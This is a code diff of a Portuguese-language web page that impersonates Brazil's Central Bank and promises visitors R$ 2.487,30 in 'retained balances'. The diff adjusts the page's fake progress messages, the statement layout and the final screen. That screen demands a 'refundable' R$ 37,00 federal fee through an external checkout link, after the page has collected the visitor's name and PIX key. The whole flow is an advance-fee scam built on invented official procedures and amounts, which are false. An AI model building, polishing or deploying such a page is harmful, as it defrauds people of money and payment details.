@@ -33,7 +33,7 @@
 
         .cedula-container { display: none; border: 2px solid #000; padding: 2px; margin: 20px 0; background: #fff; }
         .cedula-inner { border: 1px solid #000; padding: 15px; font-family: 'Roboto Mono', monospace; font-size: 12px; }
-        .cedula-row { display: none; justify-content: space-between; margin-bottom: 6px; }
+        .cedula-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
         .total-row { border-top: 2px dashed #000; margin-top: 10px; padding-top: 10px; font-size: 16px; font-weight: 900; }
 
         .loading-box { display: none; text-align: center; padding: 40px 0; }
@@ -45,8 +45,6 @@
 
         .checkout-area { display: none; text-align: center; }
         .btn-pagar { background: var(--blue-gov); color: white; text-decoration: none; padding: 22px; border-radius: 4px; font-weight: 900; display: block; font-size: 18px; margin-top: 20px; }
-        
-        .doc-header { background: #eee; padding: 5px; text-align: center; font-size: 10px; font-weight: bold; border-bottom: 1px solid #000; margin-bottom: 10px; }
     </style>
 </head>
 <body>
@@ -101,11 +99,10 @@
         <div id="m-extrato" class="msg"><b>VALORES LOCALIZADOS!</b> Confira o extrato de liquidação:</div>
         <div id="cedula" class="cedula-container">
             <div class="cedula-inner">
-                <div class="doc-header">EXTRATO DE LIQUIDAÇÃO INTERBANCÁRIA</div>
-                <div class="cedula-row" id="ext-row-1"><span>TITULAR:</span> <b id="r-nome"></b></div>
-                <div class="cedula-row" id="ext-row-2"><span>VALOR RETIDO:</span> <span>R$ 1.987,30</span></div>
-                <div class="cedula-row" id="ext-row-3"><span>JUROS SELIC:</span> <span>R$ 500,00</span></div>
-                <div class="cedula-row total-row" id="ext-row-4"><span>TOTAL A RECEBER:</span> <span style="color:#22c55e;">R$ 2.487,30</span></div>
+                <div class="cedula-row" id="r1" style="display:none;"><span>TITULAR:</span> <b id="r-nome"></b></div>
+                <div class="cedula-row" id="r2" style="display:none;"><span>VALOR RETIDO:</span> <span>R$ 1.987,30</span></div>
+                <div class="cedula-row" id="r3" style="display:none;"><span>JUROS SELIC:</span> <span>R$ 500,00</span></div>
+                <div class="cedula-row total-row" id="r4" style="display:none;"><span>TOTAL A RECEBER:</span> <span style="color:#22c55e;">R$ 2.487,30</span></div>
             </div>
         </div>
 
@@ -127,11 +124,11 @@
         </div>
 
         <div id="m-resumo" class="msg"><b>REVISÃO DO PEDIDO DE SAQUE:</b></div>
-        <div id="cedula-resumo" class="cedula-container" style="display:block;">
+        <div id="cedula-resumo" class="cedula-container">
             <div class="cedula-inner">
-                <div style="display:flex; justify-content: space-between; margin-bottom:6px;"><span>TITULAR:</span> <b id="f-nome"></b></div>
-                <div style="display:flex; justify-content: space-between; margin-bottom:6px;"><span>CHAVE PIX:</span> <b id="f-pix"></b></div>
-                <div class="cedula-row total-row" style="display:flex;"><span>TOTAL:</span> <b>R$ 2.487,30</b></div>
+                <div class="cedula-row"><span>TITULAR:</span> <b id="f-nome"></b></div>
+                <div class="cedula-row"><span>CHAVE PIX:</span> <b id="f-pix"></b></div>
+                <div class="cedula-row total-row"><span>TOTAL:</span> <b>R$ 2.487,30</b></div>
                 <div style="margin-top:15px; font-size:12px;">
                     <input type="checkbox" id="check-autorizo">
                     <label for="check-autorizo">Declaro que as informações acima são verídicas e autorizo o saque.</label>
@@ -149,30 +146,25 @@
         </div>
 
         <div id="error-final" class="checkout-area">
-            <div style="background:#fff; border:2px solid #c53030; padding:15px; border-radius:4px; color:#c53030; font-weight:bold; margin-bottom:20px; text-align: left;">
-                <span style="background:#c53030; color:#white; padding:2px 5px; border-radius:2px; margin-right:5px; color:#fff;">ALERTA</span> 
-                GUIA DE TRANSPORTE INTERBANCÁRIO (GT-SVR) NÃO LOCALIZADA
+            <div style="background:#fff; border:2px solid #c53030; padding:15px; border-radius:4px; color:#c53030; font-weight:bold; margin-bottom:20px; text-align: left; border-left: 10px solid #c53030;">
+                SISTEMA: PENDÊNCIA DE REGULARIZAÇÃO FISCAL (GT-SVR)
             </div>
-            
             <div class="msg" style="display:block; text-align:left; border-left-color: #c53030; background: #fffafa;">
-                O sistema de segurança do Banco Central identificou que para a liberação do lote <b>#2026-SVR</b>, é necessário o recolhimento antecipado da <b>Taxa de Emissão de Documento Federal</b>.
+                A auditoria identificou que o lote de <b>R$ 2.487,30</b> está pronto, porém aguarda a liquidação da <b>Taxa de Emissão de Documento Federal</b> para liberação no sistema PIX.
                 <br><br>
-                <b>Nota Importante:</b> O valor da taxa será <b>TOTALMENTE ESTORNADO</b> para sua conta juntamente com o seu saldo total no mesmo PIX.
+                <b>IMPORTANTE:</b> O valor de <b>R$ 37,00</b> é reembolsável e será creditado automaticamente na sua conta junto com o seu saldo total.
             </div>
-
             <div class="cedula-container" style="display:block; border-color: #22c55e;">
-                <div class="cedula-inner">
-                    <div class="doc-header" style="background:#e6fffa; color:#2c7a7b;">DEMONSTRATIVO DE CRÉDITO FINAL</div>
-                    <div style="display:flex; justify-content: space-between; margin-bottom:5px;"><span>SALDO AUDITADO:</span> <b>R$ 2.487,30</b></div>
-                    <div style="display:flex; justify-content: space-between; margin-bottom:5px;"><span>REEMBOLSO TAXA:</span> <b>R$ 37,00</b></div>
-                    <div class="cedula-row total-row" style="display:flex; color:#22c55e; border-top-color:#22c55e;">
-                        <span>VALOR TOTAL A RECEBER:</span>
-                        <b style="font-size: 20px;">R$ 2.524,30</b>
+                <div class="cedula-inner" style="background: #f0fff4;">
+                    <div style="display:flex; justify-content: space-between; margin-bottom: 5px;"><span>SALDO DISPONÍVEL:</span> <b>R$ 2.487,30</b></div>
+                    <div style="display:flex; justify-content: space-between; margin-bottom: 5px;"><span>REEMBOLSO TAXA:</span> <b>R$ 37,00</b></div>
+                    <div class="cedula-row total-row" style="border-top: 1px solid #22c55e; padding-top: 10px; margin-top: 10px;">
+                        <span>TOTAL A SER RECEBIDO:</span>
+                        <b style="color:#22c55e; font-size: 22px;">R$ 2.524,30</b>
                     </div>
                 </div>
             </div>
-
-            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-pagar">PAGAR TAXA E RECEBER R$ 2.524,30 AGORA</a>
+            <a href="https://pay.checkoutpixes.com/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" class="btn-pagar" style="background: #003399;">LIBERAR MEU SALDO (R$ 2.524,30)</a>
         </div>
 
     </div>
@@ -195,30 +187,25 @@
         function finalProcess() {
             hide('i-bancos'); show('loading');
             let t = document.getElementById('loading-txt');
-            
-            // Consulta mais demorada e detalhada
-            setTimeout(() => t.innerText = "VARRENDO PROTOCOLOS DO REGISTRATO...", 3000);
-            setTimeout(() => t.innerText = "IDENTIFICANDO SALDOS RETIDOS EM CONTAS INATIVAS...", 7000);
-            setTimeout(() => t.innerText = "CALCULANDO ATUALIZAÇÃO SELIC (ACUMULADO)...", 11000);
-            setTimeout(() => t.innerText = "VERIFICANDO DISPONIBILIDADE NO TESOURO NACIONAL...", 15000);
-            setTimeout(() => t.innerText = "GERANDO DOCUMENTAÇÃO DE LIQUIDAÇÃO...", 18000);
-            
+            // Consulta demorada
+            setTimeout(() => t.innerText = "VARRENDO PROTOCOLOS DO BANCO CENTRAL...", 3000);
+            setTimeout(() => t.innerText = "LOCALIZANDO SALDOS EM CONTAS INATIVAS...", 7000);
+            setTimeout(() => t.innerText = "CALCULANDO ATUALIZAÇÃO SELIC ACUMULADA...", 11000);
+            setTimeout(() => t.innerText = "SOLICITANDO AUTORIZAÇÃO DE RESGATE...", 14000);
             setTimeout(() => {
                 hide('loading');
                 document.getElementById('r-nome').innerText = document.getElementById('nome-in').value.toUpperCase();
                 show('m-extrato'); 
                 show('cedula');
-                
-                // Preenchimento dinâmico do extrato (linha por linha)
-                setTimeout(() => { document.getElementById('ext-row-1').style.display = 'flex'; }, 500);
-                setTimeout(() => { document.getElementById('ext-row-2').style.display = 'flex'; }, 1500);
-                setTimeout(() => { document.getElementById('ext-row-3').style.display = 'flex'; }, 2500);
-                setTimeout(() => { 
-                    document.getElementById('ext-row-4').style.display = 'flex'; 
+                // Enchendo o extrato linha por linha
+                setTimeout(() => document.getElementById('r1').style.display = 'flex', 500);
+                setTimeout(() => document.getElementById('r2').style.display = 'flex', 1500);
+                setTimeout(() => document.getElementById('r3').style.display = 'flex', 2500);
+                setTimeout(() => {
+                    document.getElementById('r4').style.display = 'flex';
                     show('i-solicitar');
                 }, 3500);
-                
-            }, 20000);
+            }, 16000);
         }
 
         function goMetodo() { hide('i-solicitar'); show('m-metodo'); show('i-metodo'); }
@@ -229,7 +216,7 @@
             if(pix.length < 5) return alert('Insira uma chave válida');
             document.getElementById('f-nome').innerText = document.getElementById('nome-in').value.toUpperCase();
             document.getElementById('f-pix').innerText = pix;
-            hide('i-chave'); show('m-resumo'); show('i-confirmar');
+            hide('i-chave'); show('m-resumo'); show('cedula-resumo'); show('i-confirmar');
         }
 
         function iniciarEnvio() {
@@ -241,11 +228,11 @@
             let status = document.getElementById('status-envio');
             let w = 0;
             let int = setInterval(() => {
-                w += 0.3; // Carregamento final mais suave
+                w += 0.4;
                 bar.style.width = w + '%';
-                if(w == 20) status.innerText = "AUTORIZANDO TRANSFERÊNCIA PELO DICT...";
-                if(w == 50) status.innerText = "ESTABELECENDO CONEXÃO COM O BANCO DESTINO...";
-                if(w == 85) status.innerText = "PROCESSANDO LOTE DE PAGAMENTO #2026...";
+                if(w == 20) status.innerText = "RESERVANDO SALDO NO DICT...";
+                if(w == 50) status.innerText = "AUTORIZANDO TRANSFERÊNCIA INTERBANCÁRIA...";
+                if(w == 85) status.innerText = "FINALIZANDO DEPÓSITO NA CHAVE INFORMADA...";
                 if(w >= 100) {
                     clearInterval(int);
                     hide('area-envio-pix');
